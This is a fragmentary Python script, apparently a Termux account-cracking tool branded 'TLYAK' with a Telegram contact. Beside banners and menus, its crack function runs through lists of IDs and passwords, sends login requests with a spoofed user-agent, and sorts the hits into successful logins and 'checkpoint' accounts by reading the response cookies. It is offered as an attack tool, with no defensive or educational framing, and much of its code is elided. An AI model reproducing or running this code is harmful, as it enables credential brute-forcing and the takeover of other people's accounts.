...
print(" WITH THE UPDATE TERMUX YOU") 
...
print('\n\033[1;32m ••• > YOUR NAME <•••')
name2 = input('\033[1;37mNAWUT BNUSA : \033[1;32m')
os.system('espeak -a 300 " Welcome,   "'+name2)
logo =f"""                                                                        
\033[1;37m
...
CRATE BY >> tlyak
\033[1;37m------------------------------------------------
\033[1;37m░ TELEGRAM   : \033[1;32m @I4m_tly4k
\033[1;37m░ Status     :  \033[1;32m PRO TLYAK                          
\033[1;37m------------------------------------------------
 """
 #------------------[ DYAR ]-------------------#
...
def setting():
 ...
 ##   print('\033[0;92m=============================')
    hu = input('\033[1;37m[\033[1;34m!\033[1;37m] HLABZHRA: ')
    if hu in ['1','01']:
    ...
    print("\033[1;37m[1] METHOD [\033[1;32mTP LINK,IQ,FTTH,KOREK\033[1;37m]")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r{Z}[TLYAK-WITH]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]—[{K}{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]     ")
    sys.stdout.flush()
    ...
    'user-agent': ua,
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r[{b}CP-TLYAK-✖{x}]{b} {b}{idf} | {pw}')
                ...
                print(f'\r{x}-TLYAK-OK- {H}{idf} | {pw}{ua}{M}\n')
